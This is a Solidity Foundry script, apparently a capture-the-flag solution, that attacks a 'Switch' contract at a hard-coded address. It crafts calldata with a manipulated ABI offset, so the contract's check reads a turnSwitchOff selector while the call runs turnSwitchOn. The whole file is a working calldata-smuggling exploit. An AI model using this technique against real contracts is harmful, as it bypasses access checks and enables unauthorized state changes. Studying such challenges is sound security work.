// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Switch.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();

        Switch victim = Switch(0x2Dc868E0e590D58C710EFeA18406687a7eeA1cb0);

        bytes memory data = abi.encodePacked(
            victim.flipSwitch.selector,
            abi.encode(0x44),              // offset -> &length
            abi.encode(0x0),               // dummy
            victim.turnSwitchOff.selector, // fake
            abi.encode(0x4),               // length
            victim.turnSwitchOn.selector   // real data
        );

        address(victim).call(data);

        vm.stopBroadcast();
    }
}